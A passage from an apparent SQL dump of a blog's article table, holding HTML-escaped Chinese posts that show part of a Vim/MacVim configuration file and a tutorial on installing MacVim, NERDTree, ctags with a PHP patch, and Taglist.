\r\n&quot;Move a line of text using ALT+[jk] or Comamnd+[jk] on mac \r\nnmap &amp;lt;M-j&amp;gt; mz:m+&amp;lt;cr&amp;gt;`z \r\nnmap &amp;lt;M-k&amp;gt; mz:m-2&amp;lt;cr&amp;gt;`z \r\nvmap &amp;lt;M-j&amp;gt; :m&#039;&amp;gt;+&amp;lt;cr&amp;gt;`&amp;lt;my`&amp;gt;mzgv`yo`z \r\nvmap &amp;lt;M-k&amp;gt; :m&#039;&amp;lt;-2&amp;lt;cr&amp;gt;`&amp;gt;my`&amp;lt;mzgv`yo`z \r\n             \r\nif MySys() == &quot;mac&quot; \r\n  nmap &amp;lt;D-j&amp;gt; &amp;lt;M-j&amp;gt; \r\n  nmap &amp;lt;D-k&amp;gt; &amp;lt;M-k&amp;gt; \r\n  vmap &amp;lt;D-j&amp;gt; &amp;lt;M-j&amp;gt; \r\n  vmap &amp;lt;D-k&amp;gt; &amp;lt;M-k&amp;gt; \r\nendif \r\n             \r\n&quot;Delete trailing white space, useful for Python ;) \r\nfunc! DeleteTrailingWS() \r\n  exe &quot;normal mz&quot; \r\n  %s/s+$//ge \r\n  exe &quot;normal `z&quot; \r\nendfunc \r\nautocmd BufWrite *.py :call DeleteTrailingWS() \r\n             \r\nset guitablabel=%t \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; short Tab Label \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nset guitablabel=%{ShortTabLabel()} \r\nfunction ShortTabLabel () \r\n  let bufnrlist = tabpagebuflist (v:lnum) \r\n  let label = bufname (bufnrlist[tabpagewinnr (v:lnum) -1]) \r\n  let filename = fnamemodify (label, &#039;:t&#039;) \r\n  return filename \r\nendfunction \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Cope \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; Do :help cope if you are unsure what cope is. It&#039;s super useful! \r\nmap &amp;lt;leader&amp;gt;cc :botright cope&amp;lt;cr&amp;gt; \r\nmap &amp;lt;leader&amp;gt;n :cn&amp;lt;cr&amp;gt; \r\nmap &amp;lt;leader&amp;gt;p :cp&amp;lt;cr&amp;gt; \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; bufExplorer plugin \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nlet g:bufExplorerDefaultHelp=0 \r\nlet g:bufExplorerShowRelativePath=1 \r\nmap &amp;lt;leader&amp;gt;o :BufExplorer&amp;lt;cr&amp;gt; \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Minibuffer plugin \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nlet g:miniBufExplModSelTarget = 1 \r\nlet g:miniBufExplorerMoreThanOne = 2 \r\nlet g:miniBufExplModSelTarget = 0 \r\nlet g:miniBufExplUseSingleClick = 1 \r\nlet g:miniBufExplMapWindowNavVim = 1 \r\nlet g:miniBufExplVSplit = 25 \r\nlet g:miniBufExplSplitBelow=1 \r\n             \r\nlet g:bufExplorerSortBy = &quot;name&quot; \r\n             \r\nautocmd BufRead,BufNew :call UMiniBufExplorer \r\n             \r\nmap &amp;lt;leader&amp;gt;u :TMiniBufExplorer&amp;lt;cr&amp;gt; \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Omni complete functions \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nautocmd FileType css set omnifunc=csscomplete#CompleteCSS \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Spell checking \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot;Pressing ,ss will toggle and untoggle spell checking \r\nmap &amp;lt;leader&amp;gt;ss :setlocal spell!&amp;lt;cr&amp;gt; \r\n             \r\n&quot;Shortcuts using &amp;lt;leader&amp;gt; \r\nmap &amp;lt;leader&amp;gt;sn ]s \r\nmap &amp;lt;leader&amp;gt;sp [s \r\nmap &amp;lt;leader&amp;gt;sa zg \r\nmap &amp;lt;leader&amp;gt;s? z= \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Python section \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nlet python_highlight_all = 1 \r\nau FileType python syn keyword pythonDecorator True None False self \r\n             \r\nau BufNewFile,BufRead *.jinja set syntax=htmljinja \r\nau BufNewFile,BufRead *.mako set ft=mako \r\n             \r\nau FileType python inoremap &amp;lt;buffer&amp;gt; $r return \r\nau FileType python inoremap &amp;lt;buffer&amp;gt; $i import \r\nau FileType python inoremap &amp;lt;buffer&amp;gt; $p print \r\nau FileType python inoremap &amp;lt;buffer&amp;gt; $f #--- PH ----------------------------------------------&amp;lt;esc&amp;gt;FP2xi \r\nau FileType python map &amp;lt;buffer&amp;gt; &amp;lt;leader&amp;gt;1 /class \r\nau FileType python map &amp;lt;buffer&amp;gt; &amp;lt;leader&amp;gt;2 /def \r\nau FileType python map &amp;lt;buffer&amp;gt; &amp;lt;leader&amp;gt;C ?class \r\nau FileType python map &amp;lt;buffer&amp;gt; &amp;lt;leader&amp;gt;D ?def \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; JavaScript section \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nau FileType javascript call JavaScriptFold() \r\nau FileType javascript setl fen \r\nau FileType javascript setl nocindent \r\n             \r\nau FileType javascript imap &amp;lt;c-t&amp;gt; AJS.log();&amp;lt;esc&amp;gt;hi \r\nau FileType javascript imap &amp;lt;c-a&amp;gt; alert();&amp;lt;esc&amp;gt;hi \r\n             \r\nau FileType javascript inoremap &amp;lt;buffer&amp;gt; $r return \r\nau FileType javascript inoremap &amp;lt;buffer&amp;gt; $f //--- PH ----------------------------------------------&amp;lt;esc&amp;gt;FP2xi \r\n             \r\nfunction! JavaScriptFold() \r\n    setl foldmethod=syntax \r\n    setl foldlevelstart=1 \r\n    syn region foldBraces start=/{/ end=/}/ transparent fold keepend extend \r\n             \r\n    function! FoldText() \r\n    return substitute(getline(v:foldstart), &#039;{.*&#039;, &#039;{...}&#039;, &#039;&#039;) \r\n    endfunction \r\n    setl foldtext=FoldText() \r\nendfunction \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; MRU plugin \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nlet MRU_Max_Entries = 400 \r\nmap &amp;lt;leader&amp;gt;f :MRU&amp;lt;CR&amp;gt; \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Command-T \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nlet g:CommandTMaxHeight = 15 \r\nset wildignore+=*.o,*.obj,.git,*.pyc \r\nnoremap &amp;lt;leader&amp;gt;j :CommandT&amp;lt;cr&amp;gt; \r\nnoremap &amp;lt;leader&amp;gt;y :CommandTFlush&amp;lt;cr&amp;gt; \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; Vim grep \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nlet Grep_Skip_Dirs = &#039;RCS CVS SCCS .svn generated&#039; \r\nset grepprg=/bin/grep -nH \r\n             \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; MISC \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; Remove the Windows ^M - when the encodings gets messed up \r\nnoremap &amp;lt;Leader&amp;gt;m mmHmt:%s/&amp;lt;C-V&amp;gt;&amp;lt;cr&amp;gt;//ge&amp;lt;cr&amp;gt;&#039;tzt&#039;m \r\n             \r\n&quot;Quickly open a buffer for scripbble \r\nmap &amp;lt;leader&amp;gt;q :e ~/buffer&amp;lt;cr&amp;gt; \r\nau BufRead,BufNewFile ~/buffer iab &amp;lt;buffer&amp;gt; xh1 =========================================== \r\n             \r\nmap &amp;lt;leader&amp;gt;pp :setlocal paste!&amp;lt;cr&amp;gt; \r\n             \r\nmap &amp;lt;leader&amp;gt;bb :cd ..&amp;lt;cr&amp;gt; \r\n             \r\n             \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\n&quot; =&amp;gt; tag list \r\n&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot; \r\nlet Tlist_Ctags_Cmd=&quot;/usr/local/bin/ctags&quot; \r\n             \r\nlet Tlist_Use_Right_Window=1&lt;/pre&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;font-size:16px;color:#cc0000&quot;&gt;该配置支持mac os / windows / linux ，其他系统的同学可以将func! MySys()的返回值改成自己相应的系统。&lt;/span&gt;&lt;/p&gt;&lt;p style=&quot;text-indent:2em;&quot;&gt;&lt;span style=&quot;font-size:16px;color:#cc0000&quot;&gt;由于楼主也不全懂，所以对于配置参数的说明，后面如果有时间再加&lt;/span&gt;&lt;span style=&quot;font-size:16px;color:#cc0000&quot;&gt;。&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;', 1386770104);
INSERT INTO `la_article` (`id`, `archiveid`, `content`, `updatetime`) VALUES
(24, 24, '&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;安装MACVIM&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;MACVIM下载地址：&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/b4winckler/macvim/downloads&quot;&gt;https://github.com/b4winckler/macvim/downloads&lt;/a&gt;&lt;/p&gt;&lt;p&gt;解压缩下载到的文件，然后将MacVim.app复制到Applications文件夹下，右键点击该app文件，点选show package contents可以看到app里面的详细文件信息，包括macvim以及vim的源文件，后面我们可以在该目录下修改macvim的配置信息以及安装插件。&lt;/p&gt;&lt;p&gt;打开/etc/bashrc文件，将以下代码添加到文件中&lt;/p&gt;&lt;p&gt;alias macvim=&amp;#39;/Applications/macvim.app/Contents/MacOS/MacVim&amp;#39;&lt;/p&gt;&lt;p&gt;以后可以在terminal中直接启动macvim&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;配置MACVIM&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;MAC OS下的vim配置文件在~/.gvimrc，如果该文件不存在，可以手动创建一个。然后是编辑该.gvimrc文件，文件内容请参考&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/luochuan/article/details/7252916&quot;&gt;http://blog.csdn.net/luochuan/article/details/7252916&lt;/a&gt;，由于个人也是从网上找的一个配置，所以具体的参数信息不做说明，不过据说是vim的完美配置，由于mac的需要以及个人的喜好，修改了其中的部分参数，主要是ui界面和文件编码等。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#cc0000&quot;&gt;php代码颜色配置(laphp.vim)请参考&lt;/span&gt;：&lt;a target=&quot;_blank&quot; href=&quot;http://blog.csdn.net/luochuan/article/details/7250163&quot;&gt;http://blog.csdn.net/luochuan/article/details/7250163&lt;/a&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;安装目录和文件导航插件NERDTREE&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;NERDTREE是vim的一个功能非常强大的目录导航插件，下载地址：&lt;a target=&quot;_blank&quot; href=&quot;http://www.vim.org/scripts/script.php?script_id=1658&quot;&gt;http://www.vim.org/scripts/script.php?script_id=1658&lt;/a&gt;&lt;/p&gt;&lt;p&gt;下载之后解压，找到NERD_tree.txt和NERD_tree.vim文件，然后将这两个文件分别复制到/Applications/MacVim.app/Contents/Resources/vim/runtime/doc 和 /Applications/MacVim.app/Contents/Resources/vim/runtime/plugin 目录下。&lt;/p&gt;&lt;p&gt;我们可以在macvim的命令模式下输入&lt;span style=&quot;color:#ff0000;background-color:#ffffff&quot;&gt;:&lt;/span&gt;&lt;span style=&quot;color:#ff0000;background-color:#ffffff&quot;&gt;NERDTreeToggle&lt;/span&gt;来打开或关闭NERDTree&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#ff00&quot;&gt;注意：&lt;/span&gt;使用过程中，你可能会因为删除一个文件夹，而没有删除这个文件夹所绑定的标签，出现以下错误&lt;/p&gt;&lt;p&gt;NERDTree: 1 invalid bookmarks w...&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#ff00&quot;&gt;解决：&lt;/span&gt;打开macvim.app的相应目录，进入到.NERDTreeBookmarks目录，删除里面无用的标签即可。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;安装ctags&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;ctags + taglist可以列出已打开文件中定义的&lt;span style=&quot;color:#ff00&quot;&gt;类&lt;/span&gt;、&lt;span style=&quot;color:#ff00&quot;&gt;函数&lt;/span&gt;、&lt;span style=&quot;color:#ff00&quot;&gt;常量&lt;/span&gt;，甚至&lt;span style=&quot;color:#ff00&quot;&gt;变量&lt;/span&gt;。&lt;/p&gt;&lt;p&gt;下载地址：&lt;a target=&quot;_blank&quot; href=&quot;http://ctags.sourceforge.net/&quot;&gt;http://ctags.sourceforge.net/&lt;/a&gt;&lt;/p&gt;&lt;p&gt;解压进入ctags目录&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;打上PHP补丁（否则按下ctrl+n，连基本的function include等函数都出不来）：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;wget http://svn.bitflux.ch/repos/public/misc/ctags-php5.patch&lt;/span&gt;&lt;/p&gt;&lt;div&gt;&lt;span style=&quot;color:#339999&quot;&gt;patch php.c ctags-php5.patch&lt;/span&gt;&lt;/div&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;编译安装：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;./configure&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;make&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;sudo make install&lt;/span&gt;&lt;/p&gt;然后会生成安装之后的文件目录/usr/local/bin/ctags&lt;p&gt;打开.gvimrc，将以下代码添加到文件最后&lt;/p&gt;&lt;p&gt;let Tlist_Ctags_Cmd=&amp;quot;/usr/local/bin/ctags&amp;quot;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;安装代码导航插件Taglist&lt;/strong&gt;&lt;/span&gt;&lt;p&gt;下载地址：&lt;a target=&quot;_blank&quot; href=&quot;http://www.vim.org/scripts/script.php?script_id=273&quot;&gt;http://www.vim.org/scripts/script.php?script_id=273&lt;/a&gt;&lt;/p&gt;&lt;p&gt;解压之后将doc/taglist.txt和plugin/taglist.vim分别复制到/Applications/MacVim.app/Contents/Resources/vim/runtime/doc 和 /Applications/MacVim.app/Contents/Resources/vim/runtime/plugin 目录下。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;此时Ctags和Taglist已经结合起来，再用macvim编辑php文件， 执行&lt;span style=&quot;color:#ff00&quot;&gt; :TlistToggle&lt;/span&gt; 就会在右边出现一个当前文件的&lt;span style=&quot;color:#ff00&quot;&gt;类 函数 变量&lt;/span&gt; 等东西。&lt;/p&gt;&lt;p&gt;将taglist显示在macvim右边，需要在.gvimrc里添加设置代码：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;let Tlist_Use_Right_Window=1&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;ctags方法定位&lt;/strong&gt;&lt;/span&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;ctags有一个强大的功能就是可以快速的定位到函数的位置，我们可以用它方便的跟踪代码。&lt;/p&gt;&lt;p&gt;以我自己的一个项目laugh为例，terminal切换到项目目录&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;ctags -R *&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;打开macvim&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;:cd laugh目录&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;:set tags=tags&lt;/span&gt;&lt;/p&gt;&lt;p&gt;这样，我们就设置好了laugh的tags标签选项，接下来我们查找一个方法getUser&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;方法一：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;:tag getUser&lt;/span&gt;&lt;/p&gt;&lt;p&gt;如果&lt;span style=&quot;color:#000000&quot;&gt;getUser&lt;/span&gt;方法的定义只存在一个文件中你会看到VIM打开了该文件，并把光标定位到&lt;span style=&quot;color:#000000&quot;&gt;getUser&lt;/span&gt;方法所在行上。&lt;/p&gt;&lt;p&gt;如果&lt;span style=&quot;color:#000000&quot;&gt;getUser&lt;/span&gt;方法的定义存在多个文件中，会提示：&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;找到 tag：1 / 3 或更多&lt;/span&gt;&lt;/p&gt;&lt;p&gt;这时我们可以列出保护这个方法的所有文件&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#339999&quot;&gt;:tselect &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;&amp;quot;显示列表&lt;/span&gt;&lt;/p&gt;&lt;p&gt;这时会列出所有文件，让我们选择一个文件打开&lt;/p&gt;&lt;p&gt;# pri kind tag &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;文件&lt;br /&gt;&amp;gt; 1 F C f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;span style=&quot;color:#000000&quot;&gt;getUser&lt;/span&gt; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; function/my_function.php&lt;br /&gt; &amp;nbsp; 2 F &amp;nbsp; &amp;nbsp; f &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; getUser &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; xxx/xxx.php&lt;br /&gt;键入数字和回车(empty cacels) :&lt;/p&gt;&lt;p&gt;根据提示输入我们想查看的文件对应的序号然后回车就可以了。&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#ff00&quot;&gt;&lt;span style=&quot;color:#339999&quot;&gt;:tn &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;显示后一个tag到的PHP文件&lt;br /&gt;:tp &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;quot;显示前一个tag到的PHP文件&lt;br /&gt;:tags &amp;nbsp; &amp;quot;显示标签栈&lt;/span&gt;&lt;br /&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;我们还可以把鼠标停留在想要跳转的 &lt;span style=&quot;color:#ff00&quot;&gt;类 函数 变量&lt;/span&gt; 上面，然后按 &lt;span style=&quot;color:#339999&quot;&gt;command + ] &lt;/span&gt;,回到原来位置是 &lt;span style=&quot;color:#339999&quot;&gt;command&lt;/span&gt;&lt;span style=&quot;color:#339999&quot;&gt; + t&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;方法二：&lt;/span&gt;&lt;/p&gt;&lt;p&gt;把鼠标停留在 &lt;span style=&quot;color:#000000&quot;&gt;getUser&lt;/span&gt; 上面，然后按&lt;span style=&quot;color:#339999&quot;&gt;command&lt;/span&gt;&lt;span style=&quot;color:#339999&quot;&gt;+]&lt;/span&gt;，也可以直接跳转到该方法位置，之后我们可以按&lt;span style=&quot;color:#339999&quot;&gt;command+o&lt;/span&gt; 返回。&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;color:#009900&quot;&gt;关于同屏分割文件编辑，命令行模式输入&lt;/span&gt;&lt;/p&gt;&lt;p&gt;:split another-file &amp;quot;上下分割&lt;br style=&quot;margin:0px;padding:0px&quot; /&gt;:vsplit another-file &amp;quot;左右分割&lt;/p&gt;&lt;p&gt;&lt;br /&gt;&lt;/p&gt;&lt;p&gt;&lt;span style=&quot;font-size:18px&quot;&gt;&lt;strong&gt;配置PHP函数自动补全&lt;/strong&gt;&lt;/span&gt;&lt;/p&gt;&lt;p&gt;首先，先在~/.vim/下面新建一个文件夹dict，并创建php_function_list.txt文件：&lt;br /&gt;mkdir ~/.vim/dict&lt;br /&gt;touch ~/.vim/dict/php_function_list.txt&lt;br /&gt;&lt;br /&gt;然后打开php函数列表的链接：&lt;br /&gt;&lt;a target=&quot;_blank&quot; 